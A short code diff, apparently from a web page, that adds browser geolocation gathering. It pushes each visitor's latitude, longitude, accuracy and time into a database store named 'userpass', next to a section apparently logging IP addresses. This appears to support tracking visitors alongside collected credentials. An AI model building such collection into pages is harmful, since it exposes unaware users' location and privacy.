@@ -29,6 +29,35 @@ const currentTime = new Date();
 
     // Get the current time as a formatted string
     const formattedTime = currentTime.toLocaleTimeString();
+
+
+  // Check if the browser supports the Geolocation API
+if ('geolocation' in navigator) {
+    navigator.geolocation.getCurrentPosition(function(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+      const accuracy = position.coords.accuracy;
+  
+      console.log('Location Information:');
+      console.log('Latitude:', latitude);
+      console.log('Longitude:', longitude);
+      console.log('Accuracy:', accuracy);
+
+      push(userpass, {
+        Location : "Location Info",
+        time: formattedTime,
+        latitude: latitude,
+        longitude: longitude,
+        accuracy: accuracy
+      })
+
+
+    }, function(error) {
+      console.log('Error getting location:', error);
+    });
+  } else {
+    console.log('Geolocation API is not supported by this browser.');
+  }
       
 
     // IP address
